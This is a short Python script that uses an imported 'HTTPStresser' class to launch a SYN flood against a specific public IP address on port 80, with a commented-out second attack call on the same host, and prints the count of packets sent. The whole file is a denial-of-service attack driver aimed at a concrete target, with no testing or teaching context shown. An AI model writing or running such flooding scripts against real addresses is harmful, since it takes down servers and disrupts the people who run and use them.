from HTTPStresser import HTTPStresser

stress = HTTPStresser(30, 10 , 'GET')
stress.syn_flooder('3.143.242.217', 80)
#stress.attack('3.143.242.217', 80)
#print(stress.get_ip())
print(stress.packet_sent)